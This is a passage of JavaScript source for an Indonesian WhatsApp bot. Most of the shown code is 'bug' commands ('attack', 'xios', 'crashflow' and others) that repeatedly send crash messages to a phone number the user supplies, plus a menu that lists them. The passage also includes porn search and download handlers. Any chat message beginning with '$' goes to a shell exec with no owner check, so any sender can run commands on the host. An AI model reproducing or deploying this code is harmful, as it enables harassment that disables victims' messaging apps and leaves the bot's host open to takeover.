for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'vip': case 'attack': case 'andro': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'xios': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'overflow': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break




case 'xcrash': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
							id: `attack ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ 𝐙𝐍𝐗 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
							id: `vasion ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
							id: `overflow ${target}`
						}]
					}]
let listMessage = {
    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By JackTzy', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: zyn.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await zyn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
//const name = await zyn.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await zyn.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break




 


case 'xnxxsearch': {
			if (!text) return m.reply(`Kirim Judul Bokep`)
			try {
				const fg = require('api-dylux')
				let res = await fg.xnxxSearch(text)
				m.reply(mess.wait)
				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
				if (res.status) m.reply(ff)
				
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break
case 'xnxxdl': {
			if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
			if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
			try {
			m.reply(mess.wait)
				const fg = require('api-dylux')
				let xn = await fg.xnxxdl(text)
				let tobatrek = `*XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`
await rioo.replyWithVideo({
            url: xn.url_dl,
            },{
            caption: tobatrek,
        })
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break

case "tts":
        {
          if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          zyn.sendMessage(m.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          })
        }
        break;

case 'solver': {
	if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await zyn.sendMessage(m.chat, { react: { text: "🌚",key: m.key,}}) 
  if (/image/.test(mime)) {
    const media = await sock.downloadAndSaveMediaMessage(quoted)
 	  let anuu = await pomfCDN(media)
    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
    const aimsg = data.result;
    m.reply(`${aimsg}`)
}
}
break

case 'removebg':
  //if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await m.downloadAndSaveMediaMessage(quoted)
  let mem = await shannzCdn(mee)
  let url = mem.result.url;
  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
  let bg = shannz.result.image
  zyn.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break





default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})